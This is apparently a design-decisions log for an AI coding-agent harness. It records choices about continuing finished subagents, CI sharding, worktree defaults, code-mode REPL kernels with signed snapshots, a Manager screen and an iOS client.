- **Budget semantics are unchanged**: the session tree budget (concurrency, fan-out,
  tokens, cost, per-root-turn window) is kept as is.

## A finished native subagent can be continued, still foreground-only

Amends the decision above without reviving it: `subagent` gains an optional `resume`
(a finished child's `agent_id`), and a follow-up is another **blocking** call. There is
still no detached child, report queue, wake, idle slot or `subagent_send`. Decisions:

- **One tool.** `resume` extends `subagent` rather than adding a tool, so the registry,
  code-mode catalog and the `Task(<role>:<tier>)` rule family are unchanged.
- **Cold continuation over durable state.** The child's SQLite session is the storage of
  record; a follow-up reopens it and appends one user message. No provider conversation id
  is stored. Provider prompt caching is an optional optimization that is neither promised
  nor asserted; the report states measured usage only.
- **Identity is the recorded one.** A resume is authorized under the child's recorded role
  and tier, never the default role (the omitted `subagent_type` is kept distinct from an
  explicit one); unresolvable ids fail closed to `resume:unresolved`; incompatible
  overrides are refused. Authority is recomputed (`current parent ∩ current role ∩
  recorded tools`, current permissions, re-resolved tier) and never widened.
- **Immutable config in the child log.** `agent.config` (role prompt snapshot, tools,
  model/fallbacks, tier, effort, limits, workspace) is written once, redacted, never
  relayed or sent to a model; the parent log carries `config_sha` only. A role-file edit
  does not change a continued child. Children without a record (older, Antigravity) are not
  continuable; Claude Code worker children carry an `external` block in the record (see above). Chosen over fields on `agent.spawned` (bloats and relays a sensitive
  prompt to every UI) and over a new table (migration).
- **Continuation is not fan-out.** `SubagentBudget.reserve_continuation` charges
  tokens/cost like a spawn but does not touch `children`; separate caps (8 follow-ups per
  root turn, 4 runs per child, from the durable log) are fixed defaults, not config, since
  nothing yet shows users need to tune them. Failed and cancelled runs count; nothing
  retries.
- **v1 limits.** Native Nexus children that ended `completed`, without a worktree. Failed,
  cancelled, interrupted, closed, external, worktree and legacy children, and user-initiated
  continuation from a UI, are out of scope. The run closes `continuable: no` for any
  non-completed outcome.
- **A continuation never touches the child's context.** It appends one user message to the
  same session; it writes no second `agent.config`, rebuilds no stored setup and rewrites no
  prior record. The request is still reassembled from the full log each call (the durable
  conversation and the assembled context are different things), with the recorded prompt
  snapshot, so provider caching *may* apply, unguaranteed (the system/environment prefix is
  not promised byte-identical). Compaction is refused rather than performed on a resumed child
  (`ContextManager._refuse_compaction`): history goes out verbatim, with no tool-result
  eviction, summary or handoff (the `compact_at_fraction` trigger is skipped too), and
  `ContextFullError` is raised only when the raw history would have to be cut. The runtime dry-runs the assembly (`ContextManager.preflight`) before appending the
  follow-up, so a refusal leaves the append-only child log untouched and the child continuable
  (`agent.completed.unchanged`). The cost: a long-lived child ends with "start a new subagent"
  instead of silently shrinking.

## CI compiles Rust once and shards the Python suite (2026-10-22)

The serial macOS job took about 29 minutes: Rust was built three times (`uv sync` editable
install, the `build` job, cibuildwheel) and 6,971 tests ran serially. Now `rust` builds and tests
the TUI once (cached) and hands the debug binary to the Python shards through
`NEXUS_TUI_BINARY`; the shards set `CARGO=false`, which setuptools-rust honours, so the
`optional` bins are skipped instead of compiled (`uv sync` drops from about 2 minutes to
seconds). The separate `build` job is gone: the packaging tests build the wheel in-process and
already run in the shards, and `native-wheels` covers real wheels whenever native inputs change.
A PR that changes only `CHANGELOG.md`, the release manifest and version lines (release-please)
skips the heavy jobs; `ci-ok` treats skipped as success. Trade-off: a `CARGO=false` run does
not prove the bins still build from the editable install; `rust` and `native-wheels` do.
Not verified on hosted CI yet.

## Manager launches default to worktrees

The manager prompt makes `session_launch` use `worktree=true` with a descriptive name as title every time, so the
user's main checkout is untouched unless they explicitly ask for it. A non-Git workspace falls back to
`worktree=false` with a disclosure to the user. The tool schema default stays `false` (debug MCP and other callers
are unchanged); the policy is prompt-level, so offline tests pin the wording only. See [manager.md](manager.md).

## System-prompt parts are uncapped by default

`context.limits.*` (`memory`, `agents_md`, `skills_index`, `environment`, `attachments`) used to default to
8000/8000/4000/2000/20000 tokens, which silently truncated users' `AGENTS.md` and memory. They now default to
`None` (uncapped): users want those files delivered whole. The input budget, the priority-0 overflow check and
the drop/truncate-by-priority allocation still bound every part, and an explicitly configured cap still
truncates. Budget metadata reports `cap: null` for an uncapped part. See [context.md](context.md).

## Continuing a subagent is its own tool

`subagent_continue(agent_id, prompt)` replaced `resume` on `subagent`. Models such as codex/gpt-6.1-sol fill
every optional field of every call (`resume: "none"`, `tools: []`, `model: ""`, `description: ". "`), so each
attempt to start a subagent was refused as a malformed continuation and retried dozens of times; rewording the
schema text did not help. Splitting the tool removes the field that caused the confusion instead of asking the
model not to fill it. Empty or placeholder optionals on `subagent` now count as omitted (an empty `tools` must
not mean "no tools"). The new tool sits in the same bundle and permission family (`subagent(...)` rules match
it) and reuses the runner's resume path unchanged. See [agents.md](agents.md#continuing-a-finished-subagent).

## Code mode: the `code` tool is removed; start handshake over an inline catalog

The one-shot `code` tool put the whole callable catalog (about 2500 tokens of stubs) in its
description on every request whether or not the model used it, could not choose which MCP
servers it wanted, and kept only a small JSON `store` between programs. It is replaced by four
tools (`code_start`, `code_attach`, `code_run`, `code_reset`) over a persistent Monty REPL
session per `(session, agent)` (kernel plan §7: Monty REPL over IPython; separate tools;
direct tools stay).

- **The start request is the handshake; the manual is the reply.** The tool list stays small
  and stable (better prompt caching), the catalog is paid for only when used, it sits in
  context where the user can read exactly what the model was told, and the model chooses
  servers, tools, a search or context targets. Cost: one extra model round trip and the
  manual's bytes once per kernel (measured by `benchmark/codemode_eval.py`: about 3.4 KB for
  the built-ins; the saving still wins when a cell replaces many calls, and loses on very
  small scenarios). `code_start` on a running kernel re-describes it without touching state,
  which is the recovery after compaction summarized the manual away. A cell without a started
  kernel is `KernelNotStarted`, never an implicit start, so the manual is always in context.
- **Variables replace the store.** `store`, `load`, `store_delete`, `store.py` and
  `inline_budget_tokens` are gone (an old config with the key loads with a one-line notice).
  Old sessions still replay: the reducer keeps `code.started`, `code.call`, `code.store` and
  `code.finished` (golden `code_mode.*`).
- **A rule or agent tools list naming `code` grants `code_run`** (`names.LEGACY_TOOL_NAMES`;
  the permission key stays `code`), and naming any of the four grants all four, so existing
  settings keep their meaning. `nexus doctor` mentions it once.
- **No Monty static type check in the kernel; arguments are checked host-side.** Monty's
  checker infers each variable's type from earlier cells, so `x = 1` then `x = 2` fails, and it
  forgets earlier imports, both fatal for a REPL (probed on 1.1.0, recorded in
  [codemode-monty-compat.md](codemode-monty-compat.md)). `argcheck.py` parses a cell with `ast`
  and checks calls of attached tools against their JSON Schemas before any host call, reporting
  only certain mistakes. This keeps the plan's "before any host call" guarantee, not its
  mechanism.
- **Restore, never replay; checkpoints are a signed cache (kernel plan §3.8, §7.3).** After a
  restart the kernel comes back from a Monty snapshot, not by re-running its cells: cells call tools
  with side effects. The session log stays the source of truth (the reducer never reads a snapshot,
  replay equals live) and also carries what a restart needs (attachments, `In [n]`, `kernel_id`).
  Snapshots are HMAC-signed because Monty does not authenticate them, and live in a
  `CREATE TABLE IF NOT EXISTS` table rather than a schema step because bumping the reset
  `SCHEMA_VERSION` would wipe databases for a cache. The helper frame limit rises to 16 MiB for
  snapshot frames only, so the 8 MiB default fits; `max_snapshot_bytes` is clamped to 8 MiB. An
  eviction restores the registry's exact in-memory snapshot (fresher than the last checkpoint, it
  includes failed cells), and the checkpoint is the fallback after a process restart. Context
  approvals are not restored from the log (an interactive grant must not be re-created by data).
- **A timeout, cancel or lost worker resets the kernel empty** (attachments kept) and says so,
  because the Phase 1 host discards the worker with the half-run cell; other errors never reset
  it. Reason: a state that may contain half of a cell's effects is worse than an announced loss.
  Since Phase 3, when a checkpoint exists the next call restores it instead (the lost cell is in
  `missing_cells`); the empty reset remains when none exists.
- **The kernel manifest names variables but never their values, and compaction never restores a kernel to list them (plan code-mode-kernel §3.9).** A summary or handoff brief is the only place the model keeps what a compacted prefix held, so the manifest (kernel id, attachments, targets, cells, and a `whos()`-style table of names, types and sizes) goes there. Values would bring secrets and bulk back into context, which the kernel exists to keep out. An evicted or lost kernel is listed from metadata with the reason its variables are absent, because restoring it just to compact would spend a worker and a snapshot on a summary. Reused summaries make no model call and keep the manifest they already have.

## Tool-call wrap-up reminders are context, not limits

`agent.tool_call_nudge` defaults to 300 assistant tool calls per turn. Persist
reminders as atomic user-role notice/event pairs at request boundaries, rather
than steering, so replay retains the same model context and users see why the
harness asked for a wrap-up. Hard stops take precedence; child counts are isolated.

## GPT Live opens the Manager screen; launches move once per manager turn (plan 10, 2026-10)

The manager gets its own screen instead of the blanked ordinary conversation: `Ctrl+X .`
toggles it next to `Ctrl+X A` (kept), the top bar names it (`◆ Manager · <model>`, Live phase
while a call is open), a board lists the managed roots newest first (six rows plus `+N more`),
and the composer reads `Talk to the Manager…`. Starting a GPT Live call moves to that screen
once the call connects — a reversal of the plan-02 "Live never switches the session on screen"
rule, because the user wants the manager visible during a call. Never on a refused consent or
unavailable helper, never over a modal, panel, dashboard, recording or pending prompt (then a
toast offers `Open Manager`), and ending the call never switches back. The composer already
sent to the manager when it is in front and stays usable during a call: no routing change.

When the manager launches a session while the user is talking to it (typing, or a Live call
following it), the client still moves to the new session — but only the first launch of a
manager turn moves. Moving twice in one breath is disorienting; later launches of the same
turn raise an info toast with an `Open` action, and a blocked move carries the same action.
Implemented offline only (Python/Rust unit tests, PTY for the toggle, board and draft
retention); not verified against real Codex or GPT Live, no screenshot review.

### Agent landing versus explicit Integrate confirmation (plans 11–18)

Retain the user's explicit Integrate preview confirmation. It authorizes the
selected integration against a state-bound token; the agent's narrowly parsed
own-worktree fast-forward landing exemption is a distinct permission path.
Skipping confirmation is not required to remove agent landing prompts and would
unnecessarily broaden this change's safety scope.
## iOS uses the existing gateway presentation stream

The iOS session client consumes the gateway's existing snapshot plus SSE `ops`
contract and sends existing host commands; it introduces no core or gateway
protocol. One app-owned stream follows the selected session, with fresh snapshots
on reconnect and epochs rejecting late responses. A bounded 32-frame queue
resyncs on overflow. Backgrounding closes the stream. Writes are never retried
automatically because a timeout can occur after host acceptance. The first UI
supports one-time approvals and retains queued messages when stopping a turn;
persistent rules, question controls and voice integration remain separate work.
Transport and app-state behavior are mock-tested; physical-device networking and
runtime UI remain unverified without a simulator runtime/device.
